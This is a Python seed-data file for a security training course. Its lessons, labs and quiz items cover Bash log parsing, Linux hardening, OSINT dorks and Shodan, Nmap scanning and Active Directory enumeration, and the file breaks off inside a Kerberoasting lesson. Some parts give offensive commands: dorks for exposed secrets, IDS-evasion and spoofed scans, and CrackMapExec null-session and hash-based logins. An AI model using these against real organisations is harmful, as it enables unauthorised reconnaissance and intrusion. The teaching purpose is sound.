```

### Variables & Arrays
```bash
# String variable
TARGET="192.168.56.0/24"

# Array
PORTS=(22 80 443 8080 3306)

# Iterate
for port in "${PORTS[@]}"; do
    nc -zv "$TARGET" "$port" 2>&1
done

# Command substitution
OPEN_PORTS=$(nmap -p- --open "$TARGET" -oG - | grep open | awk '{print $2}')
```

### Conditionals & Loops
```bash
# if-else
if [[ -f "/etc/shadow" && -r "/etc/shadow" ]]; then
    echo "CRITICAL: /etc/shadow is world-readable!"
fi

# while loop — process log line by line
while IFS= read -r line; do
    if [[ "$line" =~ "Failed password" ]]; then
        echo "$line"
    fi
done < /var/log/auth.log
```

### Text Processing Arsenal
```bash
# awk — extract field
awk '{print $1}' /var/log/nginx/access.log    # extract IP addresses

# sed — substitution
sed 's/password=[^ ]*/password=REDACTED/g' config.txt

# grep — pattern matching
grep -oP '\\b\\d{1,3}(\\.\\d{1,3}){3}\\b' logfile   # extract IPs

# sort + uniq — frequency analysis
grep "Failed" auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head 20
```

### Security Script: Failed SSH Login Report
```bash
#!/usr/bin/env bash
set -euo pipefail

AUTHLOG="/var/log/auth.log"
THRESHOLD=10

echo "=== Failed SSH Login Report $(date) ==="
echo ""

# Top attacking IPs
echo "--- Top Source IPs (Failed Logins) ---"
grep "Failed password" "$AUTHLOG" \\
    | awk '{print $11}' \\
    | sort | uniq -c | sort -rn \\
    | awk -v t="$THRESHOLD" '$1 >= t {printf "  %-5s attempts from %s\\n", $1, $2}'

echo ""
echo "--- Targeted Usernames ---"
grep "Failed password" "$AUTHLOG" \\
    | awk '{print $9}' \\
    | sort | uniq -c | sort -rn | head 10
```
""",
            lab_guide_md="""## Lab: Build a Security Automation Script

### Exercise 1 — Log Parser
Write a Bash script that:
1. Reads /var/log/auth.log (or /var/log/secure on RHEL)
2. Extracts all unique IPs with > 5 failed login attempts
3. Checks each IP against AbuseIPDB (offline: check a local blacklist file)
4. Outputs a formatted HTML report

```bash
#!/usr/bin/env bash
AUTHLOG="/var/log/auth.log"
OUTPUT="/tmp/ssh_report_$(date +%Y%m%d).txt"

{
  echo "SSH Security Report — $(date)"
  echo "================================"
  grep "Failed password" "$AUTHLOG" \\
      | awk '{print $11}' \\
      | sort | uniq -c | sort -rn \\
      | while read count ip; do
          echo "  [$count attempts] $ip"
      done
} > "$OUTPUT"

echo "Report saved to $OUTPUT"
```

### Exercise 2 — SUID Audit Script
```bash
#!/usr/bin/env bash
echo "SUID Binary Audit — $(date)"
echo "================================"
find / -perm -4000 -type f 2>/dev/null | while read f; do
    owner=$(stat -c '%U' "$f")
    echo "[SUID] $f (owner: $owner)"
done
```

### Mastery Check
- [ ] Script runs without errors with `set -euo pipefail`
- [ ] Correctly parses auth.log and identifies top 5 attacking IPs
- [ ] Uses arrays and functions (not just linear scripting)
- [ ] Output is human-readable with timestamps
""",
            assessment_md="""## Self-Assessment
1. What does `set -euo pipefail` do and why is it a best practice?
2. How do you safely read a file line by line in Bash?
3. Write a one-liner to extract all unique IP addresses from a log file.
4. What is the difference between `$()` and backtick command substitution?
5. How would you write a Bash script that sends an alert if a critical file changes?
""",
            real_world_md="""## Real-World Context

**SOC Automation:** Most entry-level SOC positions require scripting ability. Analysts automate log parsing, IOC extraction, and alert triage with Bash.

**Example:** A Bash script that parses Wazuh JSON alerts, extracts IOC IPs, and cross-references them with a local threat feed is a real deliverable in a SOC analyst role.

**Certification:** Bash scripting is assessed in LPIC-1, LFCS, and is heavily used in OSCP enumeration scripts.
""",
        )
        all_topics.append(t)
        _questions(t, sa_linux.id, [
            ("In a Bash script, what does `set -u` (or `set -o nounset`) do?",
             ["Runs the script as root without password", "Causes the script to exit if an unset variable is referenced", "Disables wildcard globbing", "Enables verbose debugging output"],
             1, "set -u causes Bash to treat unset variables as errors and exit immediately. This prevents bugs where an empty variable causes unintended behavior (e.g., rm -rf $EMPTY_VAR/).", 2),
            ("Which awk command extracts the 5th field from a space-separated log line?",
             ["awk '{print $5}'", "awk 'NR==5'", "awk 'field=5'", "awk -F 5 '{print}'"],
             0, "awk '{print $5}' prints the 5th whitespace-delimited field. NR==5 would print the 5th line, not field.", 1),
            ("A security script needs to find all files modified in the last 24 hours in /etc. Which find command is correct?",
             ["find /etc -mtime 1", "find /etc -mtime -1", "find /etc -newer /etc/fstab", "find /etc -ctime +1"],
             1, "find /etc -mtime -1 finds files modified less than 1 day ago. Positive values (+1) mean more than 1 day. -ctime tracks inode change time (metadata), -mtime tracks content modification.", 2),
        ])

        # ─── Linux Topic 3 ──────────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_linux.id, week_id=week_objs[1].id,
            title="Linux Hardening & Audit",
            slug="linux-hardening-audit",
            description="SSH hardening, auditd, fail2ban, AppArmor/SELinux, and CIS benchmark compliance.",
            difficulty=3, estimated_minutes=90,
            theory_md="""## Linux System Hardening

Hardening is the process of reducing the attack surface of a Linux system. Every production Linux host in a SOC/enterprise environment should be hardened against the CIS Benchmark.

### SSH Hardening (/etc/ssh/sshd_config)
```
# Disable root login
PermitRootLogin no

# Disable password auth (use keys only)
PasswordAuthentication no
ChallengeResponseAuthentication no

# Restrict to specific users
AllowUsers operator analyst

# Limit auth attempts
MaxAuthTries 3
MaxSessions 3

# Disable X11 forwarding
X11Forwarding no

# Enable only strong ciphers (TLS 1.3 level)
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
```

### auditd — Linux Audit Framework
```bash
# Install
apt install auditd

# Key rules (add to /etc/audit/rules.d/hardening.rules)
-w /etc/passwd -p wa -k user_modification
-w /etc/shadow -p wa -k password_modification
-w /etc/sudoers -p wa -k sudo_modification
-a always,exit -F arch=b64 -S execve -k process_execution
-a always,exit -F arch=b64 -S open -F exit=-EACCES -k access_denied

# View audit logs
ausearch -k user_modification | aureport -f -i
```

### fail2ban — Brute Force Protection
```bash
# Configure /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600    # 1 hour
findtime = 600    # Look back 10 minutes

# Check banned IPs
fail2ban-client status sshd
```

### AppArmor (Ubuntu/Debian)
```bash
# Check profile status
aa-status

# Put profile in complain mode (log but don't block)
aa-complain /usr/sbin/apache2

# Enforce a profile
aa-enforce /usr/sbin/apache2
```

### CIS Benchmark Key Controls
1. Disable unused filesystems (cramfs, udf, vfat)
2. Ensure /tmp is on a separate partition with noexec
3. Disable USB storage
4. Enable kernel hardening: sysctl settings
5. Remove unnecessary packages
6. Disable IPv6 if not needed
7. Enable automatic security updates
8. Configure auditd with minimum 4-week log retention
""",
            lab_guide_md="""## Lab: Harden a Fresh Kali/Ubuntu Server

### Exercise 1 — SSH Key Setup
```bash
# Generate key pair on your workstation
ssh-keygen -t ed25519 -C "purple-team-key" -f ~/.ssh/purple_key

# Copy public key to server
ssh-copy-id -i ~/.ssh/purple_key.pub user@192.168.56.X

# Edit sshd_config and disable password auth
sudo nano /etc/ssh/sshd_config
# Set: PasswordAuthentication no
sudo systemctl restart sshd
```

### Exercise 2 — Configure auditd
```bash
sudo apt install auditd

# Add rules
sudo tee /etc/audit/rules.d/purple-team.rules << 'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k privilege_escalation
-w /var/log/wtmp -p wa -k logins
-w /var/log/btmp -p wa -k logins
-a always,exit -F arch=b64 -S execve -k exec_commands
EOF

sudo service auditd restart
sudo auditctl -l   # verify rules loaded
```

### Exercise 3 — Verify Hardening
```bash
# Check for world-readable sensitive files
stat /etc/shadow | grep Access
# Expected: Access: (0640/-rw-r-----)

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null | wc -l

# Check listening services
ss -tlnp  # only necessary ports should appear
```

### Mastery Check
- [ ] SSH key authentication works and password auth disabled
- [ ] auditd logging /etc/passwd, /etc/shadow, /etc/sudoers changes
- [ ] fail2ban banning IPs after 3 failed SSH attempts
- [ ] System scored with Lynis: target ≥ 70%
""",
            assessment_md="""## Self-Assessment
1. Why is `PermitRootLogin no` important in sshd_config?
2. What is the difference between AppArmor complain and enforce mode?
3. Which auditd syscall would detect a new user being created?
4. How does fail2ban prevent brute force attacks?
5. What does the `noexec` mount option on /tmp prevent?
""",
            real_world_md="""## Real-World Context

**Compliance:** PCI DSS, HIPAA, and SOC 2 all require hardening evidence. CIS Benchmarks are the accepted standard. Lynis generates a score and recommendations.

**Incident Response:** auditd logs are forensically invaluable — they capture every file write to sensitive directories and every sudo command execution.

**Red Team Awareness:** As an attacker, SSH keys in /home/user/.ssh/ are high-value targets. As a defender, restricting SSH access and enabling auditd is your first line of defense.
""",
        )
        all_topics.append(t)
        _questions(t, sa_linux.id, [
            ("Which auditd rule monitors for changes to /etc/sudoers and tags them with the key 'privilege_escalation'?",
             ["-a always,exit -F path=/etc/sudoers -k privilege_escalation",
              "-w /etc/sudoers -p wa -k privilege_escalation",
              "-w /etc/sudoers -p rx -k privilege_escalation",
              "-a task -F path=/etc/sudoers -k privilege_escalation"],
             1, "-w watches a file, -p wa specifies write and attribute-change permissions, -k assigns the key tag. -a always,exit with -F path is also valid but -w is the conventional approach for file watches.", 2),
            ("After configuring fail2ban with maxretry=3 and bantime=3600, an IP is banned after 4 failed SSH attempts. What does fail2ban do to block the IP?",
             ["Modifies /etc/hosts.deny to reject the IP", "Inserts a DROP rule in iptables/nftables", "Kills the SSH daemon temporarily", "Removes the user's public key from authorized_keys"],
             1, "fail2ban inserts iptables (or nftables) rules to DROP or REJECT packets from the banned IP for the configured bantime period.", 2),
            ("The noexec mount option on /tmp prevents which attack technique?",
             ["Attackers from reading files in /tmp", "Execution of binaries or scripts uploaded to /tmp", "Creation of symbolic links in /tmp", "Privilege escalation via SUID binaries in /tmp"],
             1, "noexec prevents execution of binaries placed in /tmp. Attackers frequently upload and execute malware from /tmp because it is world-writable. noexec forces them to move to other locations.", 3),
        ])

        # ================================================================
        # PILLAR 3: OSINT & RECONNAISSANCE
        # ================================================================

        t = _topic(
            skill_area_id=sa_recon.id, week_id=week_objs[2].id,
            title="Passive OSINT — Google Dorks, Shodan & FOCA",
            slug="passive-osint-google-shodan",
            description="Collect intelligence without touching the target using Google dorks, Shodan, Censys, and metadata extraction.",
            difficulty=2, estimated_minutes=85,
            theory_md="""## Passive OSINT: Gathering Intelligence Without Detection

Passive OSINT collects information about a target without generating traffic on their network. It is the first phase of any professional pentest or red team engagement.

### Google Dorking (Google Hacking)

Google's advanced search operators expose sensitive information indexed from public-facing systems.

**Essential Operators:**
```
site:target.com              — limit to target domain
filetype:pdf site:target.com — find PDF documents
inurl:admin site:target.com  — admin panel URLs
intitle:"index of" site:target.com — open directory listings
"password" filetype:xlsx site:target.com — Excel files with "password"
```

**High-Value Dorks:**
```
# Exposed configuration files
site:target.com filetype:env OR filetype:cfg OR filetype:ini

# Login pages
site:target.com inurl:login OR inurl:signin OR inurl:admin

# Exposed databases
site:target.com filetype:sql

# Sensitive directories
site:target.com intitle:"index of" "parent directory"

# Error messages revealing stack info
site:target.com "PHP Warning" OR "PHP Error" OR "MySQL error"

# API keys in JavaScript files
site:target.com filetype:js "api_key" OR "apiKey" OR "secret"
```

### Shodan — Internet-Connected Device Search

Shodan indexes banners from internet-connected devices — servers, IoT, industrial control systems.

```
# Search target's IP range
net:203.0.113.0/24

# Find specific service on target domain
hostname:target.com port:8080

# Find exposed databases
hostname:target.com product:MongoDB

# Vulnerable services
hostname:target.com vuln:CVE-2021-44228  (Log4Shell)

# Industrial systems
hostname:target.com product:"Siemens S7-1200"
```

**Shodan Facets:** Use `org:`, `country:`, `city:`, `os:` to narrow results.

### Censys — Certificate & Infrastructure Intelligence

Censys indexes TLS certificates and scans all IPv4 addresses.

```
# Find all subdomains via certificates
parsed.names: target.com

# Find services on a host
ip: 203.0.113.10

# Find misconfigured services
parsed.subject.organization: "Target Corp" AND services.port: 27017
```

### FOCA — Metadata Extraction

FOCA (Fingerprinting Organizations with Collected Archives) extracts metadata from publicly available documents.

```bash
# Linux alternative: exiftool
exiftool document.pdf

# Reveals: Author name, software version, creation date, GPS coordinates (images)
# Also: internal hostnames, usernames, file paths embedded in Office documents

# Automated collection with Metagoofil
metagoofil -d target.com -t pdf,doc,xls -o /tmp/target_meta
```

### OSINT Framework Categories

1. **Username enumeration:** Sherlock, WhatsMyName
2. **Email:** hunter.io, theHarvester, phonebook.cz
3. **Infrastructure:** Shodan, Censys, FOFA, ZoomEye
4. **Social:** LinkedIn OSINT, OSINT Framework
5. **Code repos:** GitHub dorks, GitLab, truffleHog
""",
            lab_guide_md="""## Lab: Full Passive OSINT on Test Target

### Scenario: You are conducting a black-box pentest. Begin with passive recon only.

### Exercise 1 — Google Dorking
Search for: `site:testphp.vulnweb.com` (public DVWA clone — safe to test)
- Find admin pages
- Find exposed file listings
- Find error messages

### Exercise 2 — theHarvester
```bash
theHarvester -d target.com -b all -l 500 -f report.html

# Sources: Google, Bing, LinkedIn, Twitter, Shodan
# Collects: emails, subdomains, IPs, virtual hosts
```

### Exercise 3 — Shodan CLI
```bash
# Install
pip3 install shodan
shodan init YOUR_API_KEY

# Search for target
shodan search --fields ip_str,port,org,hostnames "hostname:target.com"

# Get host details
shodan host 203.0.113.10
```

### Exercise 4 — Metadata Extraction
```bash
# Download documents from target
wget -q "https://target.com/docs/annual_report.pdf"

# Extract metadata
exiftool annual_report.pdf | grep -iE "author|creator|software|path|username"
```

### Exercise 5 — GitHub Recon
```bash
# GitHub dorks (in GitHub search):
org:targetcompany password
org:targetcompany api_key
org:targetcompany filename:.env
```

### Mastery Check
- [ ] Documented 5+ Google dork findings
- [ ] Ran theHarvester and collected emails and subdomains
- [ ] Found at least one Shodan result for target infrastructure
- [ ] Extracted metadata from at least one document
- [ ] Compiled findings into a structured recon report template
""",
            assessment_md="""## Self-Assessment
1. What is the difference between passive and active reconnaissance?
2. Which Google dork operator restricts results to a specific domain?
3. What type of information does Shodan index that Google does not?
4. Why is metadata extraction (FOCA/exiftool) valuable during recon?
5. What is a "GitHub dork" and what can it expose?
""",
            real_world_md="""## Real-World Context

**Bug Bounty:** Google dorking frequently surfaces unrestricted admin panels, exposed `.env` files with API keys, and unprotected staging environments — all valid bug bounty findings.

**Red Team:** Before touching a client's network, a professional red team spends 1-2 weeks on passive OSINT only. Client contact names, email formats, VPN product versions, and cloud providers are all discoverable without generating a single packet on the target network.

**Certification:** OSCP requires OSINT as part of the initial enumeration phase. PNPT (TCM Security) has an entire module on OSINT.
""",
        )
        all_topics.append(t)
        _questions(t, sa_recon.id, [
            ("Which Google dork would find PDF files hosted on target.com that might contain sensitive information?",
             ["site:target.com intitle:pdf", "filetype:pdf site:target.com", "google:target.com filetype:pdf", "inurl:target.com ext:pdf"],
             1, "filetype:pdf site:target.com is the correct Google dork syntax. The filetype: operator restricts to specific file extensions, combined with site: to limit the domain.", 1),
            ("What type of information does Shodan index that standard search engines like Google do not?",
             ["Social media profiles and public posts", "Service banners, open ports, and device metadata from internet-facing systems", "Email addresses from WHOIS records", "JavaScript source code from web applications"],
             1, "Shodan scans the internet and collects raw service banners (HTTP, SSH, FTP, Modbus, etc.), open port data, TLS certificate details, and device metadata — making it a unique source of infrastructure intelligence.", 2),
            ("During passive OSINT, an analyst extracts a PDF from the target's website using exiftool and finds 'Author: jsmith; Company: TargetCorp; Template: \\\\fileserver01\\templates\\contract.dotx'. What does this reveal?",
             ["The PDF is encrypted and cannot be read", "An internal username (jsmith), company name, and an internal network file path including a hostname (fileserver01)", "The document was created on Windows XP", "The target uses Microsoft OneDrive"],
             1, "Document metadata often reveals internal usernames, Active Directory domain paths, internal server hostnames, and software versions — all valuable for social engineering and network recon.", 3),
        ])

        # ─── OSINT Topic 2 ──────────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_recon.id, week_id=week_objs[2].id,
            title="Active Reconnaissance — Nmap Mastery",
            slug="active-recon-nmap",
            description="Nmap host discovery, port scanning, OS/version detection, NSE scripts, and scan detection evasion.",
            difficulty=3, estimated_minutes=100,
            theory_md="""## Nmap: The Network Mapper — Complete Reference

Nmap is the gold-standard tool for active reconnaissance. A professional must understand every scan type, output format, and NSE category.

### Scan Types & When to Use Them

| Scan Type | Flag | Description | Noise Level |
|-----------|------|-------------|-------------|
| SYN (Stealth) | `-sS` | Default; sends SYN, reads SYN-ACK/RST | Medium |
| Connect | `-sT` | Full TCP; no root required | High |
| UDP | `-sU` | Slow; for DNS/SNMP/TFTP discovery | Medium |
| NULL | `-sN` | No flags; evades some firewalls | Low |
| FIN | `-sF` | FIN only; RFC-compliant bypass | Low |
| Xmas | `-sX` | FIN+URG+PSH; IDS evasion | Low |
| ACK | `-sA` | Firewall mapping (no open/closed) | Low |
| Window | `-sW` | Like ACK but examines window size | Low |
| Idle/Zombie | `-sI` | Uses zombie host to scan | Very Low |

### Host Discovery Techniques
```bash
# Ping sweep (default)
nmap -sn 192.168.56.0/24

# No ping (skip host discovery — assume up)
nmap -Pn 192.168.56.10

# TCP SYN ping on port 80
nmap -PS80 192.168.56.0/24

# ARP ping (local network)
nmap -PR 192.168.56.0/24

# Trace route + discovery
nmap --traceroute -sn 192.168.56.0/24
```

### The Professional Scan Workflow
```bash
# Phase 1: Quick top-1000 port scan
nmap -sV -sC -O -oA /tmp/recon_quick 192.168.56.10

# Phase 2: Full port scan
nmap -p- --open -sV -oA /tmp/recon_full 192.168.56.10

# Phase 3: Targeted NSE scripts
nmap -p 139,445 --script smb-vuln-ms17-010 192.168.56.10
nmap -p 80,443 --script http-auth,http-title,http-methods 192.168.56.10

# Phase 4: UDP scan (top 100)
nmap -sU --top-ports 100 -oA /tmp/recon_udp 192.168.56.10
```

### NSE Script Categories

| Category | Purpose | Example Scripts |
|----------|---------|----------------|
| `safe` | Won't harm target | `http-title`, `ssh-hostkey` |
| `default` | `-sC` runs these | Standard safe scripts |
| `vuln` | Vulnerability checks | `smb-vuln-ms17-010`, `ssl-heartbleed` |
| `exploit` | Actual exploitation | `smb-psexec` |
| `auth` | Authentication bypass | `http-auth`, `ftp-anon` |
| `brute` | Credential brute force | `ssh-brute`, `ftp-brute` |
| `discovery` | Information gathering | `dns-brute`, `snmp-info` |
| `intrusive` | May harm/alert target | Use with caution |

### Output Formats
```bash
-oN output.txt     # Normal
-oX output.xml     # XML (import to Metasploit/Burp)
-oG output.gnmap   # Grepable
-oA output         # All three simultaneously
```

### Firewall & IDS Evasion
```bash
# Decoy scan (use fake source IPs)
nmap -D RND:10 192.168.56.10

# Fragment packets (bypass packet inspection)
nmap -f 192.168.56.10

# Slow scan (evade rate-based detection)
nmap -T1 192.168.56.10  # Paranoid (very slow)

# Spoof source IP (requires raw socket access)
nmap -S 10.0.0.1 -e eth0 192.168.56.10

# Randomize host order
nmap --randomize-hosts 192.168.56.0/24
```
""",
            lab_guide_md="""## Lab: Comprehensive Nmap Scan of GOAD Lab

### Target: GOAD Domain Controller (192.168.56.10) — your offline lab

### Phase 1: Discovery
```bash
# Find all live hosts
sudo nmap -sn 192.168.56.0/24 -oG - | grep "Status: Up"
```

### Phase 2: Service Enumeration
```bash
sudo nmap -sV -sC -O -p- --open \\
    -oA /tmp/goad_full_scan \\
    192.168.56.10
```

### Phase 3: Targeted Vulnerability Scanning
```bash
# Check SMBv1 / EternalBlue
sudo nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 192.168.56.10

# Check MSRPC / Kerberos / LDAP (AD)
sudo nmap -p 88,389,636,3268 --script ldap-rootdse,krb5-enum-users 192.168.56.10

# Check web services
sudo nmap -p 80,443,8080,8443 --script http-title,http-auth 192.168.56.10
```

### Phase 4: Parse Results
```bash
# Extract open ports from grepable output
grep "open" /tmp/goad_full_scan.gnmap | awk '{print $5}' | tr ',' '\\n' | grep open

# Import XML to Metasploit
msfconsole -q -x "db_import /tmp/goad_full_scan.xml; hosts; services"
```

### Mastery Check
- [ ] Identified all open ports on the GOAD DC
- [ ] Ran at least 3 NSE script categories
- [ ] Saved output in all three formats (N, X, G)
- [ ] Generated a findings summary with service version and potential vulnerabilities
""",
            assessment_md="""## Self-Assessment
1. What is the difference between a SYN scan and a connect scan?
2. Why would you use nmap -Pn against a target?
3. Which NSE script category is used for vulnerability assessment?
4. How does a decoy scan help evade detection?
5. What does the -sU flag add to a scan and why is it slow?
""",
            real_world_md="""## Real-World Context

**Pentest Reports:** Every finding in a professional pentest report originates from a scan. nmap output (especially service version detection) is the foundation of your report's scope section.

**Detection (Blue Team):** nmap SYN scans generate predictable patterns: many SYN packets to sequential ports from a single source. Wazuh Rule 40101 detects port scanning. Sigma rule `nmap_scan.yml` catches nmap OS detection fingerprinting.

**Certification:** nmap is mandatory on OSCP, CEH, eCPPT, and eJPT practical exams.
""",
        )
        all_topics.append(t)
        _questions(t, sa_recon.id, [
            ("An nmap SYN scan sends a SYN packet and the target responds with SYN-ACK. What does nmap do next to classify the port as open without completing the handshake?",
             ["Sends an ACK to complete the connection", "Sends a RST to close the connection immediately", "Ignores the response and marks it as filtered", "Sends a FIN to gracefully close"],
             1, "In a SYN (stealth) scan, after receiving SYN-ACK confirming the port is open, nmap sends RST to tear down the connection without completing the 3-way handshake. This avoids creating a full TCP connection entry in server logs.", 2),
            ("Which nmap flag would you use to run all scripts in the 'vuln' category against an SMB service on port 445?",
             ["nmap -p 445 --script vuln 192.168.56.10", "nmap -p 445 -sV --vuln 192.168.56.10", "nmap -p 445 -A --script=all 192.168.56.10", "nmap -p 445 --nse vuln 192.168.56.10"],
             0, "--script vuln runs all NSE scripts in the 'vuln' category. -A enables OS detection, version detection, script scanning (default scripts), and traceroute — but not specifically the vuln category.", 2),
            ("An IDS is configured to alert on port scans from a single source IP that hits more than 10 ports in under 1 second. Which nmap scan type would best evade this detection?",
             ["nmap -T5 (aggressive timing) 192.168.56.10", "nmap -T0 -D RND:5 --randomize-hosts (paranoid + decoys + random order)", "nmap -sV (version detection) 192.168.56.10", "nmap -A (aggressive scan) 192.168.56.10"],
             1, "-T0 (Paranoid) sends one packet every 5 minutes, evading rate-based detection. -D adds decoy source IPs to confuse IDS attribution. --randomize-hosts scatters scan patterns. Together these maximize evasion.", 3),
        ])

        # ================================================================
        # PILLAR 4: RED TEAM OPERATIONS
        # ================================================================

        t = _topic(
            skill_area_id=sa_red.id, week_id=week_objs[4].id,
            title="Active Directory Enumeration — BloodHound & ldapdomaindump",
            slug="ad-enumeration-bloodhound",
            description="Enumerate AD objects, relationships, attack paths, and permissions using BloodHound, ldapdomaindump, and CrackMapExec.",
            difficulty=3, estimated_minutes=120,
            theory_md="""## Active Directory Enumeration

Active Directory is the authentication backbone of 90%+ of enterprise environments. Enumerating it properly reveals attack paths to Domain Admin.

### AD Core Concepts

**Key Objects:**
- **Domain:** Container of all AD objects (e.g., `NORTH.SEVENKINGDOMS.LOCAL`)
- **DC (Domain Controller):** Hosts the AD database (NTDS.dit)
- **OU (Organisational Unit):** Container for grouping objects with GPOs
- **User Account:** Has SID, SAMAccountName, UPN, password hash in NTDS.dit
- **Computer Account:** Ends with `$` (e.g., `WINTERFELL$`)
- **Group:** Security groups control permissions; nesting is a common attack path
- **GPO (Group Policy Object):** Controls machine and user settings (often exploitable)
- **SPN (Service Principal Name):** Identifies services for Kerberos (Kerberoasting target)
- **ACE/ACL (Access Control Entry/List):** Defines permissions on objects

### BloodHound — Attack Path Visualisation

```bash
# Step 1: Collect AD data with SharpHound (from compromised Windows host)
.\\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Step 2: Linux alternative — bloodhound-python
bloodhound-python -d north.sevenkingdoms.local -u jon.snow -p KingInTheNorth -c All -ns 192.168.56.11

# Step 3: Start Neo4j and BloodHound
sudo neo4j start
bloodhound &

# Step 4: Import the zip file into BloodHound UI

# Key Queries in BloodHound:
# "Find Shortest Path to Domain Admin"
# "List all Kerberoastable Accounts"
# "Find AS-REP Roastable Users"
# "Find Principals with DCSync Rights"
```

### ldapdomaindump

```bash
# Dump all AD objects via LDAP
ldapdomaindump -u 'NORTH\\\\jon.snow' -p 'KingInTheNorth' 192.168.56.11

# Output: domain_*.json and domain_*.html files
# Contains: users, groups, computers, GPOs, trusts, password policies

# View results
cat domain_users.json | python3 -m json.tool | head 50
```

### CrackMapExec — AD Swiss Army Knife

```bash
# Enumerate shares (null session)
crackmapexec smb 192.168.56.0/24 --shares

# Enumerate users (with credentials)
crackmapexec smb 192.168.56.11 -u jon.snow -p KingInTheNorth --users

# Enumerate password policy
crackmapexec smb 192.168.56.11 -u '' -p '' --pass-pol

# Check local admin access across subnet
crackmapexec smb 192.168.56.0/24 -u administrator -H 'NTLM_HASH' --local-auth

# Enumerate logged-on users
crackmapexec smb 192.168.56.0/24 -u jon.snow -p KingInTheNorth --loggedon-users
```

### Key LDAP Attributes to Enumerate

```bash
# Using ldapsearch
ldapsearch -x -H ldap://192.168.56.11 -D 'NORTH\\\\jon.snow' -w 'KingInTheNorth' \\
    -b 'DC=north,DC=sevenkingdoms,DC=local' \\
    '(objectClass=user)' sAMAccountName memberOf servicePrincipalName \\
    userAccountControl pwdLastSet

# Critical userAccountControl flags:
# 0x0002 = ACCOUNTDISABLE
# 0x0010 = LOCKOUT
# 0x0040 = PASSWD_NOTREQD
# 0x10000 = DONT_EXPIRE_PASSWORD
# 0x400000 = DONT_REQ_PREAUTH  ← AS-REP Roastable!
```
""",
            lab_guide_md="""## Lab: BloodHound AD Enumeration on GOAD

### Prerequisites
- GOAD lab running (or equivalent AD lab)
- Kali with bloodhound-python, neo4j installed
- Valid domain credentials (from initial access or provided for this lab)

### Exercise 1 — Run bloodhound-python
```bash
# From Kali
bloodhound-python \\
    -d north.sevenkingdoms.local \\
    -u jon.snow -p KingInTheNorth \\
    -c All -ns 192.168.56.11 \\
    -o /tmp/bloodhound_output/

# This generates: computers.json, users.json, groups.json, domains.json
```

### Exercise 2 — Start BloodHound and Import Data
```bash
sudo neo4j start
sleep 5
bloodhound &

# In BloodHound UI:
# 1. Upload Data → select all JSON files from /tmp/bloodhound_output/
# 2. Wait for import to complete
# 3. Run: "Find Shortest Path to Domain Admins"
```

### Exercise 3 — Identify Attack Paths
In BloodHound:
1. Search for "Domain Admins" group
2. Right-click → "Shortest Paths to Here"
3. Document each hop and the relationship type
4. Run the query: "Find Kerberoastable Users"

### Exercise 4 — ldapdomaindump
```bash
ldapdomaindump \\
    -u 'NORTH\\\\jon.snow' -p 'KingInTheNorth' \\
    192.168.56.11 -o /tmp/ldap_dump/

# Open HTML reports
firefox /tmp/ldap_dump/domain_users.html &
```

### Mastery Check
- [ ] Successfully ran bloodhound-python and imported data
- [ ] Identified at least 2 paths to Domain Admin in BloodHound
- [ ] Identified all Kerberoastable SPNs
- [ ] Found AS-REP Roastable users (DONT_REQ_PREAUTH flag)
- [ ] Documented the AD password policy (min length, complexity, lockout)
""",
            assessment_md="""## Self-Assessment
1. What is a Service Principal Name (SPN) and why is it a Kerberoasting target?
2. What does the DONT_REQ_PREAUTH flag in Active Directory enable?
3. How does BloodHound represent attack paths?
4. What is the significance of DCSync rights for an attacker?
5. Which tool allows you to check SMB share access across an entire subnet?
""",
            real_world_md="""## Real-World Context

**Red Team Engagements:** BloodHound is the standard tool for mapping attack paths from initial access to Domain Admin. It's used in every major penetration test against Windows environments.

**Detection (Blue Team):** BloodHound data collection generates significant LDAP query volume. Windows Event ID 4662 (LDAP query) and Wazuh rules can detect bulk enumeration. Sigma rule `bloodhound_collection.yml` catches SharpHound activity.

**Certification:** BloodHound AD enumeration is tested in OSCP (PEN-300), eCPPT, and the PNPT practical exam.
""",
        )
        all_topics.append(t)
        _questions(t, sa_red.id, [
            ("Which Active Directory attribute flag makes a user account AS-REP Roastable?",
             ["ACCOUNTDISABLE", "PASSWD_NOTREQD", "DONT_REQ_PREAUTH", "DONT_EXPIRE_PASSWORD"],
             2, "DONT_REQ_PREAUTH (userAccountControl flag 0x400000) disables Kerberos pre-authentication for the account, allowing an unauthenticated attacker to request a TGT and offline-crack the hash.", 2),
            ("BloodHound displays an edge type 'GenericWrite' from a user to a computer object. What attack could an attacker potentially execute using this relationship?",
             ["Read the computer's LSASS memory remotely", "Modify the computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute (Resource-Based Constrained Delegation attack)", "Dump the NTDS.dit database", "Reset the computer's password"],
             1, "GenericWrite on a computer object allows an attacker to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, enabling a Resource-Based Constrained Delegation (RBCD) attack to impersonate any user to that service.", 4),
            ("Which CrackMapExec command enumerates all SMB shares accessible with null session authentication (no credentials)?",
             ["crackmapexec smb 192.168.56.0/24 --shares", "crackmapexec smb 192.168.56.0/24 -u '' -p '' --shares", "crackmapexec smb 192.168.56.0/24 --null --shares", "crackmapexec smb 192.168.56.0/24 -n --shares"],
             1, "Null session uses empty username and password (-u '' -p ''). Without credentials, CME attempts anonymous/null authentication. Some environments allow null session for legacy compatibility.", 2),
        ])

        # ─── Red Team Topic 2 ───────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_red.id, week_id=week_objs[5].id,
            title="Kerberoasting & AS-REP Roasting",
            slug="kerberoasting-asrep-roasting",
            description="Exploit Kerberos ticket granting to extract and crack service account hashes offline.",
            difficulty=4, estimated_minutes=110,
            theory_md="""## Kerberos Authentication & Roasting Attacks

Kerberos is the default authentication protocol in Active Directory environments. Understanding it deeply enables both attack and detection.

### Kerberos Flow (Simplified)

```
1. Client → KDC: AS-REQ (Authentication Service Request)
   "I am jon.snow, give me a TGT"
   [Includes pre-auth encrypted with user's password hash]

2. KDC → Client: AS-REP (Authentication Service Reply)
   "Here is your TGT, encrypted with the KDC's krbtgt hash"

